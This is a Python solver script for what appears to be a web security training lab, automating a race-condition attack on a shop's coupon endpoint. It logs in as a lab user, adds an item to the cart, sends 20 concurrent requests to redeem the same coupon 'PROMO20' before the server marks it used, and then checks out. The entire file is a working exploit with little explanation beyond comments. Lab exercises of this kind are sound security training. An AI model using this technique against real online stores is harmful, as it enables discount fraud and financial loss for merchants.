import sys
import os
import threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

# add the leather jacket to the cart (product id 1)
lab.post("/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1})
lab.info("Added jacket to cart")

# get CSRF token from the cart page
page = lab.get("/cart")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# apply the coupon code many times in parallel
# the race condition lets us use it more than once before the server marks it as redeemed
coupon = "PROMO20"
results = []

def apply_coupon():
    try:
        resp = lab.post("/cart/coupon", data={"csrf": csrf, "coupon": coupon})
        results.append(resp.status_code)
    except Exception:
        pass

lab.info(f"Applying coupon '{coupon}' in parallel...")

# send 20 concurrent requests to exploit the race window
threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

lab.info(f"Responses: {len(results)} sent")

# check the cart to see the total
page = lab.get("/cart")
soup = BeautifulSoup(page.text, "html.parser")
total_el = soup.find("th", string=lambda s: s and "Total" in s)
if total_el:
    total = total_el.find_next("th").text
    lab.info(f"Cart total: {total}")

# try to place the order
csrf = soup.find("input", {"name": "csrf"})["value"]
resp = lab.post("/cart/checkout", data={"csrf": csrf})
lab.info(f"Checkout response: {resp.status_code}")

lab.check_solved()
